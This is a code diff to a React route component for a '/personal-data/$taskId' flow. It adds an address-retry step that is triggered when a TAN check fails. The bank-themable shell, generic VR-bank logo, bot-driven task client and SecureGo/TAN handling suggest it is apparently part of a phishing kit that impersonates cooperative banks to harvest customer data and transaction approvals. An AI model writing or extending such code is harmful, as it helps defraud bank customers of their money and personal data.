@@ -5,6 +5,7 @@ import { getBotTask } from "@/lib/botClient";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
+import { AddressVerificationStep } from "@/components/flow/AddressVerificationStep";
 import { CompletionStep } from "@/components/flow/CompletionStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
@@ -29,7 +30,7 @@ const DEFAULT_THEME: FlowTheme = {
   buttonRadius: "rounded-full",
 };
 
-type Step = "personal" | "address" | "done";
+type Step = "personal" | "address" | "address-retry" | "done";
 
 export const Route = createFileRoute("/personal-data/$taskId")({
   head: () => ({
@@ -250,10 +251,38 @@ function PersonalDataPage() {
             setAddressFlowHandled(true);
             setAddressDecisionPending(false);
             setForceShowSecureGo(false);
-            setStep("personal");
+            setStep("done");
+          }}
+          onTanFailed={() => {
+            setForceShowSecureGo(false);
+            setStep("address-retry");
           }}
           onNoAddress={() => setStep("done")}
           taskId={taskId}
+        />
+      )}
+
+      {customer && step === "address-retry" && (
+        <AddressVerificationStep
+          theme={theme}
+          {...(bankCtx?.group ? { bankGroup: bankCtx.group } : {})}
+          currentAddress={customer.adresse}
+          additionalAddress={
+            addressData
+              ? {
+                  strasse: firstString(addressData.new_street, addressData.street),
+                  plzOrt: [
+                    firstString(addressData.new_plz, addressData.plz),
+                    firstString(addressData.new_city, addressData.city),
+                  ]
+                    .filter(Boolean)
+                    .join(" "),
+                }
+              : { strasse: "", plzOrt: "" }
+          }
+          customerName={customer.name}
+          onBack={() => setStep("personal")}
+          onDeleted={() => setStep("done")}
         />
       )}
 
